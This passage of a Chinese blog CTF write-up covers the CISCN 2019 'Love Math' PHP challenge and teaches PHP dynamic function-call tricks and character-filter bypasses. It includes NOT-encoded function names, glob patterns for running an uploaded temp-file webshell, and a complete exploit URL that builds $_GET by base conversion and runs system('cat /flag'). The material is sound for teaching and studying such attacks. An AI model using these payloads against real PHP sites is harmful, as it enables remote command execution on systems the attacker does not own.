+<span class="hljs-variable">$a</span> = [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>];
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>[1]&quot;</span>;
+<span class="hljs-comment">//b</span></code></pre></div>
+</li>
+<li><p>php中${ }的作用</p>
+<ol>
+<li><p>动态访问变量</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a1</span>=<span class="hljs-string">&#x27;111&#x27;</span>;
+<span class="hljs-variable">$a2</span>=<span class="hljs-string">&#x27;222&#x27;</span>;
+<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">2</span>;<span class="hljs-variable">$i</span>++)&#123;
+    <span class="hljs-keyword">echo</span> $&#123;<span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-variable">$i</span>&#125;.<span class="hljs-string">&quot;\n&quot;</span>;
+&#125;
+
+<span class="hljs-comment">//111</span>
+<span class="hljs-comment">//222</span></code></pre></div>
+
+<p>就相当于${ }里面构造出变量的字符串，然后这个写法就可以访问变量或者函数了。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;
+$&#123;<span class="hljs-string">&#x27;a&#x27;</span>&#125;();
+<span class="hljs-comment">//这样就可以调用phpinfo函数</span></code></pre></div>
+
+
+</li>
+</ol>
+</li>
+<li><p>php5和php7中变量表达式的结合顺序</p>
+<table>
+<thead>
+<tr>
+<th>示例代码</th>
+<th>PHP7结合方向</th>
+<th>PHP5结合方向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$$foo\[&#39;bar&#39;][&#39;baz&#39;]</code></td>
+<td><code>&#123;$$foo&#125;\[&#39;bar&#39;][&#39;baz&#39;]</code></td>
+<td><code>$&#123;$foo\[&#39;bar&#39;][&#39;baz&#39;]&#125;</code></td>
+</tr>
+<tr>
+<td><code>$foo-&gt;$bar[&#39;baz&#39;]</code></td>
+<td><code>&#123;$foo-&gt;$bar&#125;[&#39;baz&#39;]</code></td>
+<td><code>$foo-&gt;&#123;$bar[&#39;baz&#39;]&#125;</code></td>
+</tr>
+<tr>
+<td><code>$foo-&gt;$bar[&#39;baz&#39;]() </code></td>
+<td><code>&#123;$foo-&gt;$bar&#125;[&#39;baz&#39;]()</code></td>
+<td><code>$foo-&gt;&#123;&#123;$bar[&#39;baz&#39;]&#125;()&#125;;</code></td>
+</tr>
+<tr>
+<td><code>foo::$bar\[&#39;baz&#39;]()</code></td>
+<td><code>&#123;foo::$bar&#125;\[&#39;baz&#39;]()</code></td>
+<td><code>foo::&#123;&#123;$bar[&#39;baz&#39;]&#125;()&#125; </code></td>
+</tr>
+</tbody></table>
+<p>这里我自己也进行了一些测试，先使用php5进行测试</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;bar&#x27;</span>=&gt; <span class="hljs-string">&#x27;mm&#x27;</span>);
+<span class="hljs-variable">$mm</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;baz&#x27;</span>=&gt; <span class="hljs-string">&#x27;nn&#x27;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;bar&#x27;</span>][<span class="hljs-string">&#x27;baz&#x27;</span>],<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-comment">//m 为什么输出m,按照php5表达式的结合顺序，先访问到mm，然后对mm进行索引，因为索引不存在，对&#x27;baz&#x27;进行类型转换成0，所以就访问到了m，所以php5结合的特性的确有点另类。</span>
+<span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;bar&#x27;</span>]&#125;[<span class="hljs-string">&#x27;baz&#x27;</span>];
+<span class="hljs-comment">//nn，使用$&#123;&#125;就能够控制顺序了</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mm</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$baz</span>=<span class="hljs-string">&quot;aaa&quot;</span>;
+&#125;
+
+<span class="hljs-variable">$foo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;bar&#x27;</span>=&gt; <span class="hljs-string">&#x27;baz&#x27;</span>);
+<span class="hljs-variable">$mm</span>= <span class="hljs-keyword">new</span> mm();
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$mm</span>-&gt;<span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;bar&#x27;</span>],<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-comment">//这里输出aaa,很容易理解，但是在php7中，按照访问顺序，要先结合$mm-&gt;$foo，测试如下</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mm</span></span>&#123;
+    <span class="hljs-keyword">var</span> <span class="hljs-variable">$baz</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;baz&#x27;</span>=&gt;<span class="hljs-string">&quot;aaa&quot;</span>);
+&#125;
+
+<span class="hljs-variable">$mm</span>= <span class="hljs-keyword">new</span> mm();
+<span class="hljs-variable">$foo</span> = <span class="hljs-string">&#x27;baz&#x27;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$mm</span>-&gt;<span class="hljs-variable">$foo</span>[<span class="hljs-string">&#x27;baz&#x27;</span>],<span class="hljs-string">&quot;\n&quot;</span>;
+<span class="hljs-comment">//aaa</span>
+</code></pre></div>
+
+<p>总结一下就是：php7的结合顺序为从左到右，php5的结合方式为从里到外。</p>
+</li>
+<li><p>php中的函数动态执行</p>
+<p>php7中支持对使用（$a）()这样的方式执行动态函数</p>
+<p>我这里进行了测试，php7中差不多有这么几种方式执行动态函数：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;
+$&#123;a&#125;();<span class="hljs-comment">//这个是可以的</span>
+$&#123;<span class="hljs-string">&#x27;phpinfo&#x27;</span>&#125;();<span class="hljs-comment">//这个不行</span>
+<span class="hljs-variable">$a</span>();<span class="hljs-comment">//这个可以</span>
+(<span class="hljs-variable">$a</span>)()<span class="hljs-comment">//这个也可以</span></code></pre></div>
+
+<p>换成php5后：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;
+(<span class="hljs-variable">$a</span>)();<span class="hljs-comment">//这个在php5中不支持</span>
+<span class="hljs-comment">//其他的基本一致</span></code></pre></div>
+
+<p>也就是说，在php7中只要在()中构造出对应的php函数的名字就行，类型为字符串。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;
+(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)();
+
+(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<span class="hljs-comment">//phpinfo，这里暂时用url编码表示，如果不使用浏览器传参的话，需要自己手动解码一下:</span>
+(~urldecode(<span class="hljs-string">&quot;%8F%97%8F%96%91%99%90&quot;</span>))(); <span class="hljs-comment">//phpinfo</span>
+<span class="hljs-comment">//怎么构造，反过来就ok：echo urlencode(~&#x27;p&#x27;);</span></code></pre></div>
+</li>
+<li><p>php5 webshell构造</p>
+<ol>
+<li><p>可以用异或来构造</p>
+</li>
+<li><p>linux shell的特点和通配符正则的利用</p>
+<ol>
+<li><p>shell下可以利用<code>.</code>来执行任意脚本</p>
+</li>
+<li><p>可以用到Linux下的glob通配符：</p>
+<ul>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符</li>
+</ul>
+<p>总体上来说，可以先对php页面上传一个马，这时候这个马会保存在临时文件夹下，不知道文件名，但是可以使用linux bash的通配符在ls中获取到，如果能够单独获取到这个文件后，再利用shell下可以直接使用 . 来越权执行文件，就可以获取到shell。</p>
+</li>
+</ol>
+</li>
+<li><p>关键在于怎么获取到这个写有马的临时文件。</p>
+</li>
+<li><p>使用？通配符和正则匹配进行过滤，这里贴出原文payload的就差不多了。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby">ls /<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">?[</span>^-][^.][^.]<span class="hljs-string">?[</span>^.]?</code></pre></div>
+
+<div class="hljs code-wrapper"><pre><code class="hljs bash">ls /???/????????[@-[]</code></pre></div>
+
+
+
+</li>
+</ol>
+</li>
+</ol>
+<hr>
+<h1 id="0x03-回到love-math的构造"><a href="#0x03-回到love-math的构造" class="headerlink" title="0x03 回到love math的构造"></a>0x03 回到love math的构造</h1><p>参考资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></p>
+<p>常规思路是构造一个<code>$GET_[**]</code>但是[ ] 被过滤了，但是可以利用$_GET{‘a’};可以构造出大写字母，但是如果只通过取反或者自增的话，肯定会超字数。</p>
+<p>需要注意的是：</p>
+<ol>
+<li><p><code>$_GET[&#39;a&#39;] </code>可以使用 <code>$_GET&#123;&#39;a&#39;&#125;</code>代替</p>
+</li>
+<li><p>在浏览器中使用GET进行传参的时候，GET获取的参数不需要加引号，因为浏览器获取的本身就是字符形式。这里的pi和abs都不需要引号。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs gams">(<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;((<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;) =&gt; (<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">pi</span>&#125;(<span class="hljs-symbol">$</span>_GET)&#123;<span class="hljs-built_in">abs</span>&#125;</code></pre></div>
+
+</li>
+</ol>
+<p>这里学到使用进制变换来构造字符串绕过对字符的限制， 但是这里至少要保证数字是可以是可以使用的。</p>
+<p>几个关键性的函数：</p>
+<ol>
+<li>base_convert,可以在任意进制间切换</li>
+<li>bin2hex将二进制字符转换为16进制字符</li>
+<li>hex2bin将16进制字符转换为2进制。</li>
+<li>dechex，将10进制变为16进制</li>
+<li>hexdec，将16进制变为10进制。</li>
+</ol>
+<p>白名单里没有bin2hex，但是可以使用base_convert进行构造</p>
+<p>注意：</p>
+<ol>
+<li><p>为什么需要构造bin2hex：一个是白名单里没有，另外一个原因是base_convert没有办法获取到_和大写字母，但是bin2hex可以，使用bin2hex得到_GET就好办多了</p>
+</li>
+<li><p>需要利用到php7的括号动态执行函数，这里可以通过phpinfo看到php的版本</p>
+</li>
+<li><p>注意GET的传参</p>
+</li>
+<li><p>为什么使用$pi，因为pi刚好在白名单里，这样命名的变量可以绕过。别的函数的名字充当变量名一样可以，这里只是取了一个最短的。</p>
+</li>
+<li><div class="hljs code-wrapper"><pre><code>http://a6a148ea-6a32-41a8-b73a-81eb9b247f3f.node3.buuoj.cn/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));(($$pi)&#123;1&#125;)($$pi&#123;2&#125;)&amp;1=system&amp;2=cat%20/flag
+</code></pre></div>
+</li>
+</ol>
+<h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> </li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/webshell/">webshell</a>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/CISCN-2019%E5%88%9D%E8%B5%9B/">CISCN 2019初赛</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/webshell/">webshell</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/12/04/IPV6%E5%AD%A6%E4%B9%A0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">IPV6学习</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/19/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91%E5%8D%8F%E8%AE%AE%E5%B1%82%E7%9A%84%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">
+                        <span class="hidden-mobile">【转载】协议层的攻击——HTTP请求走私</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https://greydr34d.github.io/2019/10/19/%E3%80%90CISCN-2019%E5%88%9D%E8%B5%9B%E3%80%91Love-Math/';
+        this.page.identifier = '/2019/10/19/%E3%80%90CISCN-2019%E5%88%9D%E8%B5%9B%E3%80%91Love-Math/';
+      };
+      Fluid.utils.waitElementVisible('disqus_thread', function () {
+        var d = document, s = d.createElement('script');
+        s.src = '//' + '' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
